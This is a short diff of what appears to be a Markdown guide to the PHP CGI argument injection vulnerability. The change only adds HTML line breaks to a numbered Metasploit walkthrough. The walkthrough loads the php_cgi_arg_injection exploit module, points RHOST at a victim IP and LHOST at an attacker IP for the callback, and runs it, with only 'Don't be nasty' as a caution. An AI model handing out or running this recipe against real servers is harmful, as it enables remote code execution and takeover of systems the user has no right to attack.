@@ -5,10 +5,10 @@ This exploit is also called PHP CGI arg injection, where the exploit takes advan
 
 Here's how you'd do it syntactically using metasploit.
 
-1) Open the terminal in an environment that has Metasploit already installed. (E.g Kali Linux)
-2) Type "msf" in the command line (without the double quotes)
-3) Type use exploit/multi/http/php_cgi_arg_injection
-4) Type SET RHOST <VICTIM_IP> where VICTIM_IP is what it sounds like
-5) Type SET LHOST <ATTACKER_IP> where ATTACKER_IP is also what it sounds like
-6) Type "run" (without the double quotes)
-7) Don't be nasty
+1) Open the terminal in an environment that has Metasploit already installed. (E.g Kali Linux) <br />
+2) Type "msf" in the command line (without the double quotes) <br />
+3) Type use exploit/multi/http/php_cgi_arg_injection <br />
+4) Type SET RHOST <VICTIM_IP> where VICTIM_IP is what it sounds like <br />
+5) Type SET LHOST <ATTACKER_IP> where ATTACKER_IP is also what it sounds like <br />
+6) Type "run" (without the double quotes) <br />
+7) Don't be nasty <br />
